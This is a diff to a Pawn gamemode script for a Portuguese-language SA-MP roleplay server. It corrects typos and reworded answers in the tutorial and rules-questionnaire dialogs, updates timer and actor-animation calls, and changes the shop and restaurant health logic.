 		    KillTimer(TimerUnlockTutorial[playerid]);
 		    UnlockTutorial[playerid] = false;
-		    TimerUnlockTutorial[playerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);
-		    
+		    TimerUnlockTutorial[playerid] = SetPlayerTimer(playerid, "UnlockTutorials", 10000, false);
+
 	        return ShowPlayerDialog(playerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "TUTORIAL - Em que consiste o servidor", sdialog, "Próximo", "Sair");
 	    }
 	    case DIALOG_TUTORIAL1:
@@ -2737,8 +2739,8 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	        if(UnlockTutorial[playerid] == false)
 	        {
 				format(string, sizeof(string), "{FFFFFF}Este servidor consiste em imitar a vida real ao máximo. Para isso precisas de fazer tudo o que normalmente uma pessoa"); strcat(sdialog,string);
-				format(string, sizeof(string), "\n{FFFFFF}normal faz. Tal como um cidadão normal e com pleno juízo, terés de trabalhar para te sustentares. Tens ao teu alcance várias maneiras de ganhar"); strcat(sdialog,string);
-				format(string, sizeof(string), "\n{FFFFFF}dinheiro, desde trabalhos até ás Factions (legais ou ilegais). Com este dinheiro que futuramente ganharás, poderás adquirir carros, casas,"); strcat(sdialog,string);
+				format(string, sizeof(string), "\n{FFFFFF}normal faz. Tal como um cidadão normal e com pleno juízo, terás de trabalhar para te sustentares. Tens ao teu alcance várias maneiras de ganhar"); strcat(sdialog,string);
+				format(string, sizeof(string), "\n{FFFFFF}dinheiro, desde trabalhos até às Factions (legais ou ilegais). Com este dinheiro que futuramente ganharás, poderás adquirir carros, casas,"); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{FFFFFF}bens materiais, ir a festas e fazer tudo aquilo que te apetecer, respeitando sempre as regras do bom funcionamento do servidor."); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{FFFFFF}Mas lembra-te, tudo aquilo que não podes fazer na vida real também não podes fazer dentro do nosso servidor."); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{FFFFFF}Este é um pormenor importante do qual te deves sempre lembrar."); strcat(sdialog,string);
@@ -2746,7 +2748,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		        return ShowPlayerDialog(playerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "TUTORIAL - Em que consiste o servidor", sdialog, "Próximo", "Sair");
 	        }
 
-			format(string, sizeof(string), "{FFFFFF}O comando {99FF00}/me {FFFFFF}sé é necessário caso a ação que o jogador quer desempenhar não possa ser feita no jogo."); strcat(sdialog,string);
+			format(string, sizeof(string), "{FFFFFF}O comando {99FF00}/me {FFFFFF}só é necessário caso a ação que o jogador quer desempenhar não possa ser feita no jogo."); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FFFFFF}Exemplo: Se quiser apontar uma arma, deixa de ser necessário (ou seja, é um RP opcional) fazer o {99FF00}/me aponta a arma {FFFFFF}pois o GTA tem animação para isso."); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FFFFFF}{99FF00}/tentar {FFFFFF}- Usar uma única vez. Caso falhe, tem de desistir da ação ou encontrar outra maneira de a executar sem prejudicar o RP"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FFFFFF}de outros intrevinientes e arcar com as consquências do falhanço."); strcat(sdialog,string);
@@ -2755,7 +2757,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 			KillTimer(TimerUnlockTutorial[playerid]);
             UnlockTutorial[playerid] = false;
-            TimerUnlockTutorial[playerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);
+            TimerUnlockTutorial[playerid] = SetPlayerTimer(playerid, "UnlockTutorials", 10000, false);
 
 			return ShowPlayerDialog(playerid, DIALOG_TUTORIAL2, DIALOG_STYLE_MSGBOX, "TUTORIAL - Regras", sdialog, "Próximo", "Sair");
 	    }
@@ -2764,7 +2766,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	        if(!response) return KickPlayer(playerid, "Doge", "Não quis ver o tutorial.");
 	        if(UnlockTutorial[playerid] == false)
 	        {
-				format(string, sizeof(string), "{FFFFFF}O comando {99FF00}/me {FFFFFF}sé é necessário caso a ação que o jogador quer desempenhar não possa ser feita no jogo."); strcat(sdialog,string);
+				format(string, sizeof(string), "{FFFFFF}O comando {99FF00}/me {FFFFFF}só é necessário caso a ação que o jogador quer desempenhar não possa ser feita no jogo."); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{FFFFFF}Exemplo: Se quiser apontar uma arma, deixa de ser necessário (necessário não significa proibído) fazer o {99FF00}/me aponta a arma {FFFFFF}pois o GTA tem animação para isso."); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{FFFFFF}{99FF00}/tentar {FFFFFF}- Usar uma única vez. Caso falhe, tem de desistir da ação ou encontrar outra maneira de a executar sem prejudicar o RP"); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{FFFFFF}de outros intrevinientes e arcar com as consquências do falhanço."); strcat(sdialog,string);
@@ -2773,17 +2775,17 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 				return ShowPlayerDialog(playerid, DIALOG_TUTORIAL2, DIALOG_STYLE_MSGBOX, "TUTORIAL - Regras", sdialog, "Próximo", "Sair");
 	        }
-	        
+
 			format(string, sizeof(string), "{FFFFFF}Existem 2 tipos de chats. O chat {99FF00}IC (In-Character) {FFFFFF}é quando é a tua personagem a 'falar'. Neste chat não é permitido"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FFFFFF}o uso de acrónimos e não é permitido o uso de: OMG, LOL, pq, n, e smilies como :) :( :D xD"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FFFFFF}O chat {99FF00}OOC (Out-Of-Character) {FFFFFF}é o jogador que está a controlar a personagem a falar. Por sua vez, insultos/ameaças são puníveis com Ban."); strcat(sdialog,string);
-			
+
 			KillTimer(TimerUnlockTutorial[playerid]);
             UnlockTutorial[playerid] = false;
-            TimerUnlockTutorial[playerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);
+            TimerUnlockTutorial[playerid] = SetPlayerTimer(playerid, "UnlockTutorials", 10000, false);
 
 			return ShowPlayerDialog(playerid, DIALOG_TUTORIAL3, DIALOG_STYLE_MSGBOX, "TUTORIAL - Chats", sdialog, "Próximo", "Sair");
-	        
+
 	    }
 	    case DIALOG_TUTORIAL3:
 	    {
@@ -2796,10 +2798,10 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 				return ShowPlayerDialog(playerid, DIALOG_TUTORIAL3, DIALOG_STYLE_MSGBOX, "TUTORIAL - Chats", sdialog, "Próximo", "Sair");
 	        }
-	        
+
 			format(string, sizeof(string), "{99FF00}Metagaming: {FFFFFF}Usar conhecimentos OOC em IC"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{99FF00}Powergaming: {FFFFFF}Ações que não podem ser feitas na vida real; Forçar o roleplay sem dar chance a outras personagens de se 'defenderem'"); strcat(sdialog,string);
-			format(string, sizeof(string), "\n{FFFFFF}Tomar decisões/praticar atos que apenas beneficiem a tua personagem"); strcat(sdialog,string);
+			format(string, sizeof(string), "\n{FFFFFF}Tomar decisões/praticar atos irreais que apenas beneficiem a tua personagem"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{99FF00}Deathmatch: {FFFFFF}Matar outra personagem sem razão IC e sem divulgar a razão"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{99FF00}Bunnyhop: {FFFFFF}Saltar para chegar mais rápido a algum lado"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{99FF00}Revenge-Kill: {FFFFFF}Matar outra pessoa por ela te ter morto a ti."); strcat(sdialog,string);
@@ -2808,7 +2810,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
             KillTimer(TimerUnlockTutorial[playerid]);
             UnlockTutorial[playerid] = false;
-            TimerUnlockTutorial[playerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);
+            TimerUnlockTutorial[playerid] = SetPlayerTimer(playerid, "UnlockTutorials", 10000, false);
 
 			return ShowPlayerDialog(playerid, DIALOG_TUTORIAL4, DIALOG_STYLE_MSGBOX, "TUTORIAL - Tipos de Non-RP", sdialog, "Próximo", "Sair");
 	    }
@@ -2819,7 +2821,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	        {
 				format(string, sizeof(string), "{99FF00}Metagaming: {FFFFFF}Usar conhecimentos OOC em IC"); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{99FF00}Powergaming: {FFFFFF}Ações que não podem ser feitas na vida real; Forçar o roleplay sem dar chance a outras personagens de se 'defenderem'"); strcat(sdialog,string);
-				format(string, sizeof(string), "\n{FFFFFF}Tomar decisões/praticar atos que apenas beneficiem a tua personagem"); strcat(sdialog,string);
+				format(string, sizeof(string), "\n{FFFFFF}Tomar decisões/praticar atos irreais que apenas beneficiem a tua personagem"); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{99FF00}Deathmatch: {FFFFFF}Matar outra personagem sem razão IC e sem divulgar a razão"); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{99FF00}Bunnyhop: {FFFFFF}Saltar para chegar mais rápido a algum lado"); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{99FF00}Revenge-Kill: {FFFFFF}Matar outra pessoa por ela te ter morto a ti."); strcat(sdialog,string);
@@ -2837,7 +2839,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
             KillTimer(TimerUnlockTutorial[playerid]);
             UnlockTutorial[playerid] = false;
-            TimerUnlockTutorial[playerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);
+            TimerUnlockTutorial[playerid] = SetPlayerTimer(playerid, "UnlockTutorials", 10000, false);
 
 			return ShowPlayerDialog(playerid, DIALOG_TUTORIAL5, DIALOG_STYLE_MSGBOX, "TUTORIAL - Últimas Informações", sdialog, "Aceito", "Sair");
 	    }
@@ -2854,7 +2856,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 				return ShowPlayerDialog(playerid, DIALOG_TUTORIAL5, DIALOG_STYLE_MSGBOX, "TUTORIAL - Últimas Informações", sdialog, "Aceito", "Sair");
 	        }
-	        
+
 			format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}O Roleplay é o modo de jogo onde:"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FF9900}As pessoas seguem um conjunto de regras e tentam fazer o que acham mais correto"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FF9900}Os jogadores tentam fazer algo contrário às situações da vida quotidiana"); strcat(sdialog,string);
@@ -2866,14 +2868,14 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	    case DIALOG_QUESTIONARIO1:
 	    {
 	        if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");
-	        
+
 	        switch(listitem)
 	        {
 	            case 0:
 	            {
 					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}O Roleplay é o modo de jogo onde:"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}As pessoas seguem um conjunto de regras e tentam fazer o que acham mais correto"); strcat(sdialog,string);
-					format(string, sizeof(string), "\n{FF9900}Os jogadores tentam fazer algo contrário ás situações da vida quotidiana"); strcat(sdialog,string);
+					format(string, sizeof(string), "\n{FF9900}Os jogadores tentam fazer algo contrário às situações da vida quotidiana"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Os jogadores tentam com a sua personagem representar o dia a dia de uma pessoa, seguindo regras."); strcat(sdialog,string); //
 					format(string, sizeof(string), "\n{FF9900}Todos fazem os possíveis para representar a vida não quotidiana."); strcat(sdialog,string);
 
@@ -2906,7 +2908,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	    case DIALOG_QUESTIONARIO2:
 		{
 	        if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");
-	        
+
 	        switch(listitem)
 			{
 			    case 0:
@@ -2933,7 +2935,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				}
 				case 4: // certa
 				{
-					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se alguém fizer DeathMatch o que lhe devia acontecer?"); strcat(sdialog,string);
+					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se alguém fizer DeathMatch, o que deve acontecer ao agressor?"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Levar Admin Jail por bater no jogador"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Não lhe devia acontecer nada"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Ser preso pela polícia por agressão a um civil"); strcat(sdialog,string);
@@ -2946,12 +2948,12 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		case DIALOG_QUESTIONARIO3:
 		{
 		    if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");
-		    
+
 		    switch(listitem)
 		    {
 		        case 0:
 		        {
-					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se alguém fizer DeathMatch o que lhe devia acontecer?"); strcat(sdialog,string);
+					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se alguém fizer DeathMatch, o que deve acontecer ao agressor?"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Levar Admin Jail por bater no jogador"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Não lhe devia acontecer nada"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Ser preso pela polícia por agressão a um civil"); strcat(sdialog,string);
@@ -3046,7 +3048,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		        case 2:
 		        {
 					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se os teus amigos te pedirem boleia pelo TeamSpeak, o que deverás fazer?"); strcat(sdialog,string);
-					format(string, sizeof(string), "\n{FF9900}Devo não lhe dar boleia, porque é contra as regras"); strcat(sdialog,string); //
+					format(string, sizeof(string), "\n{FF9900}Devo não lhe dar boleia, caso contrário estarei a praticar Metagaming"); strcat(sdialog,string); //
 					format(string, sizeof(string), "\n{FF9900}Ir o mais rápido possível"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Devo reportá-lo no forum"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Todas as alineas são válidas"); strcat(sdialog,string);
@@ -3072,9 +3074,9 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		        case 0:
 		        {
 					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se os teus amigos te pedirem boleia pelo TeamSpeak, o que deverás fazer?"); strcat(sdialog,string);
-					format(string, sizeof(string), "\n{FF9900}Devo não lhe dar boleia, porque é contra as regras"); strcat(sdialog,string);
+					format(string, sizeof(string), "\n{FF9900}Devo não lhe dar boleia, caso contrário estarei a praticar Metagaming"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Ir o mais rápido possível"); strcat(sdialog,string);
-					format(string, sizeof(string), "\n{FF9900}Devo reportá-lo no forum"); strcat(sdialog,string);
+					format(string, sizeof(string), "\n{FF9900}Devo reportá-lo no fórum"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Todas as alineas são válidas"); strcat(sdialog,string);
 
 					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO6, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
@@ -3084,7 +3086,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se levares Admin Jail o que deves fazer?"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Insultar o Administrador que te deu AJ"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Ir chorar para o fórum"); strcat(sdialog,string);
-					format(string, sizeof(string), "\n{FF9900}Esperar que o tempo de AJ termine e refletir sobre os actos cometidos"); strcat(sdialog,string);
+					format(string, sizeof(string), "\n{FF9900}Esperar que o tempo de AJ termine e refletir sobre os teus atos"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Sair do servidor e nunca mais voltar"); strcat(sdialog,string);
 
 					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO7, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
@@ -3097,7 +3099,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		        {
 				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
 				}
-				case 4: 
+				case 4:
 				{
                     pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
 				}
@@ -3114,7 +3116,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se levares Admin Jail o que deves fazer?"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Insultar o Administrador que te deu AJ"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Ir chorar para o fórum"); strcat(sdialog,string);
-					format(string, sizeof(string), "\n{FF9900}Esperar que o tempo de AJ termine e refletir sobre os actos cometidos"); strcat(sdialog,string);
+					format(string, sizeof(string), "\n{FF9900}Esperar que o tempo de AJ termine e refletir sobre os teus atos"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}Sair do servidor e nunca mais voltar"); strcat(sdialog,string);
 
 					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO7, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
@@ -3131,7 +3133,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		        {
 					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Qual destes RP's não é válido?"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}/tentar abrir a lata de Coca-Cola"); strcat(sdialog,string);
-					format(string, sizeof(string), "\n{FF9900}/do Dor na perna direita"); strcat(sdialog,string);
+					format(string, sizeof(string), "\n{FF9900}/do perna direita a sangrar"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}/me aponta a arma ao sujeito e dispara"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}/me tenta abrir a porta com um pontapé mas falha"); strcat(sdialog,string);
 
@@ -3146,14 +3148,14 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		case DIALOG_QUESTIONARIO8:
 		{
 		    if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");
-		    
+
 		    switch(listitem)
 		    {
 		        case 0:
 		        {
 					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Qual destes RP's não é válido?"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}/tentar abrir a lata de Coca-Cola"); strcat(sdialog,string);
-					format(string, sizeof(string), "\n{FF9900}/do Dor na perna direita"); strcat(sdialog,string);
+					format(string, sizeof(string), "\n{FF9900}/do perna direita a sangrar"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}/me aponta a arma ao sujeito e dispara"); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FF9900}/me tenta abrir a porta com um pontapé mas falha"); strcat(sdialog,string);
 
@@ -3181,9 +3183,9 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	    case DIALOG_LOJA_MENU:
 	    {
 	        if(!response) return 1;
-	        
+
 	        new bID = GetPlayerVirtualWorld(playerid);
-	        
+
 	        switch(listitem)
 	        {
 	            case 0: // info loja
@@ -3193,7 +3195,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 			    	format(string, sizeof(string), "\n{FF9900}Preço de Entrada: {FFFFFF}%d$", bInfo[bID][Entrada]); strcat(sdialog,string);
 			    	format(string, sizeof(string), "\n{FF9900}Produtos: {FFFFFF}%d", bInfo[bID][Produtos]); strcat(sdialog,string);
 			    	format(string, sizeof(string), "\n{FF9900}Banco: {FFFFFF}%d", bInfo[bID][Bank]); strcat(sdialog,string);
-			    	
+
 	                return ShowPlayerDialog(playerid, DIALOG_LOJA_INFO, DIALOG_STYLE_MSGBOX, "Info Loja", sdialog, "Ok", "");
 	            }
 	            case 1: // preço de entrada
@@ -3219,56 +3221,56 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	    case DIALOG_LOJA_ENTRADA:
 	    {
 	        if(!response) return 1;
-	        
+
 	        if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_LOJA_ENTRADA, DIALOG_STYLE_INPUT, "PREÇO DE ENTRADA", "{FF0000}Preço inválido. {FFFFFF}Introduz o preço de entrada", "Escolher", "Sair");
 			new entrada = strval(inputtext);
 			if(entrada < 0 || entrada > 1000) return ShowPlayerDialog(playerid, DIALOG_LOJA_ENTRADA, DIALOG_STYLE_INPUT, "PREÇO DE ENTRADA", "{FF0000}Preço inválido. {FFFFFF}Introduz o preço de entrada", "Escolher", "Sair");
-			
+
 			new bID = GetPlayerVirtualWorld(playerid);
-			
+
 			bInfo[bID][Entrada] = entrada;
-			
+
 			GuardarBizz(bID);
 			AtualizarBiz(bID);
-			
+
 			format(string, sizeof(string), "Alteraste o preço de entrada da tua loja para %d$", entrada);
 			SendClientMessage(playerid, COLOR_INFO, string);
-			
+
 			return 1;
 	    }
 	    case DIALOG_LOJA_NOME:
 	    {
 	        if(!response) return 1;
 	        if(strlen(inputtext) > 16) return ShowPlayerDialog(playerid, DIALOG_LOJA_NOME, DIALOG_STYLE_INPUT, "NOME DA LOJA", "{FF0000}O nome tem de ter menos de 16 letras. {FFFFFF}Introduz o novo nome da loja. Isto vai custar-te 5000$.", "Escolher", "Sair");
-	        
+
 	        new bID = GetPlayerVirtualWorld(playerid);
-	        
+
 	        format(bInfo[bID][Nome], 32, "%s", inputtext);
-	        
+
 	        GuardarBizz(bID);
 	        AtualizarBiz(bID);
-	        
+
   			format(string, sizeof(string), "Alteraste o nome da tua loja para %s", inputtext);
 			SendClientMessage(playerid, COLOR_INFO, string);
-			
+
 			return 1;
 	    }
 	    case DIALOG_LOJA_EXTRAIR:
 		{
 		    if(!response) return 1;
 		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_LOJA_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR LOJA", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");
-		    
+
 		    new dinheiro = strval(inputtext);
 		    new bID = GetPlayerVirtualWorld(playerid);
-		    
+
 		    if(dinheiro < 0) return ShowPlayerDialog(playerid, DIALOG_LOJA_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR LOJA", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");
 		    if(bInfo[bID][Bank] < dinheiro) return ShowPlayerDialog(playerid, DIALOG_LOJA_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR LOJA", "{FF0000}Não tens esse dinheiro na loja. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");
-		    
+
 		    bInfo[bID][Bank] -= dinheiro;
 		    GivePlayerMoneyEx(playerid, dinheiro);
-		    
+
             PlayerActionMessage(playerid, 15.0, "tira algum dinheiro do cofre da loja.");
-            
+
             return 1;
 		}
 	    case DIALOG_LOJA_SEGURADORA:
@@ -3278,12 +3280,12 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 			new dinheiro = strval(inputtext);
 			new bID = GetPlayerVirtualWorld(playerid);
-			
+
 			if(dinheiro < 100 || dinheiro > 500) return ShowPlayerDialog(playerid, DIALOG_LOJA_SEGURADORA, DIALOG_STYLE_INPUT, "{FFFF00}SEGURADORA", "{FF0000}Montante inválido (100-500). {FFFFFF}Introduz o montante.", "Escolher", "Sair");
 
 			bInfo[bID][Seguradora] = dinheiro;
 			GuardarBizz(bID);
-			
+
 			format(string, sizeof(string), "Alteraste a mensalidade da tua seguradora para {FF9900}%d$", dinheiro);
 			SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -3292,118 +3294,103 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	    case DIALOG_LOJA_REST:
 	    {
 	        if(!response) return 1;
-	        
+
 			new bID = GetPlayerVirtualWorld(playerid);
-			
+
 			if(bInfo[bID][Type] != BTYPE_RESTAURANTE) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás num Restaurante");
 			if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não tem produtos");
-			
-			ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
-			
+
+			ApplyDynamicActorAnimation(BizActor[bID], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
+
 	        switch(listitem)
 	        {
 	            case 0: // pizza
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA_PIZZA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	                
+
 					PlayerActionMessage(playerid, 15.0, "come uma pizza.");
 					ApplyAnimation(playerid, "FOOD", "EAT_Pizza", 4.1, 0, 1, 1, 0, 2000, 1);
-					
-					new Float:health;
-					GetPlayerHealth(playerid, health);
-					
-					if((health + 35) < 100)
+
+					if((pInfo[playerid][Vida] + 35) < 100)
 					{
-    					SetPlayerHealthEx(playerid, 35, 1);
+    					SetPlayerHealthEx(playerid, 35, HEALTH_ADD);
 					}
-					
+
 				 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA_PIZZA);
 					bInfo[bID][Bank] += PRECO_COMIDA_PIZZA;
-					
+
 					format(string, sizeof(string), "Comeste uma pizza por %d$", PRECO_COMIDA_PIZZA);
 					SendClientMessage(playerid, COLOR_INFO, string);
 	            }
 	            case 1: // hamburger
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA_HAMB) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	                
+
                     PlayerActionMessage(playerid, 15.0, "come um hamburguer.");
                     ApplyAnimation(playerid, "FOOD", "EAT_Burger",4.1, 0, 1, 1, 0, 2000, 1);
-					
-					new Float:health;
-					GetPlayerHealth(playerid, health);
 
-					if((health + 25) < 100)
+					if((pInfo[playerid][Vida] + 25) < 100)
 					{
-    					SetPlayerHealthEx(playerid, 25, 1);
+    					SetPlayerHealthEx(playerid, 25, HEALTH_ADD);
 					}
-					
+
 				 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA_HAMB);
 					bInfo[bID][Bank] += PRECO_COMIDA_HAMB;
-					
+
 					format(string, sizeof(string), "Comeste um hamburguer por %d$", PRECO_COMIDA_HAMB);
 					SendClientMessage(playerid, COLOR_INFO, string);
 	            }
 	            case 2: // bifanas
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA_BIFANAS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	                
+
                     PlayerActionMessage(playerid, 15.0, "come umas bifanas.");
                     ApplyAnimation(playerid, "FOOD", "EAT_Burger",4.1, 0, 1, 1, 0, 2000, 1);
-                    
-					new Float:health;
-					GetPlayerHealth(playerid, health);
 
-					if((health + 10) < 100)
+					if((pInfo[playerid][Vida] + 10) < 100)
 					{
-    					SetPlayerHealthEx(playerid, 10, 1);
+    					SetPlayerHealthEx(playerid, 10, HEALTH_ADD);
 					}
-                    
+
 				 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA_BIFANAS);
 					bInfo[bID][Bank] += PRECO_COMIDA_BIFANAS;
-					
+
 					format(string, sizeof(string), "Comeste umas bifanas por %d$", PRECO_COMIDA_BIFANAS);
 					SendClientMessage(playerid, COLOR_INFO, string);
 	            }
 	            case 3: // taco
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA_TACO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	                
+
                     PlayerActionMessage(playerid, 15.0, "come um taco.");
                     ApplyAnimation(playerid, "FOOD", "EAT_Chicken",4.1, 0, 1, 1, 0, 2000, 1);
-                    
-					new Float:health;
-					GetPlayerHealth(playerid, health);
 
-					if((health + 15) < 100)
+					if((pInfo[playerid][Vida] + 15) < 100)
 					{
-    					SetPlayerHealthEx(playerid, 15, 1);
+    					SetPlayerHealthEx(playerid, 15, HEALTH_ADD);
 					}
-                    
+
 				 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA_TACO);
 					bInfo[bID][Bank] += PRECO_COMIDA_TACO;
-					
+
 					format(string, sizeof(string), "Comeste um taco por %d$", PRECO_COMIDA_TACO);
 					SendClientMessage(playerid, COLOR_INFO, string);
 	            }
 	            case 4: // sande
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA_SANDE) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	                
+
                     PlayerActionMessage(playerid, 15.0, "come uma sande.");
                     ApplyAnimation(playerid, "FOOD", "EAT_Burger",4.1, 0, 1, 1, 0, 2000, 1);
-                    
- 					new Float:health;
-					GetPlayerHealth(playerid, health);
 
-					if((health + 6) < 100)
+					if((pInfo[playerid][Vida] + 6) < 100)
 					{
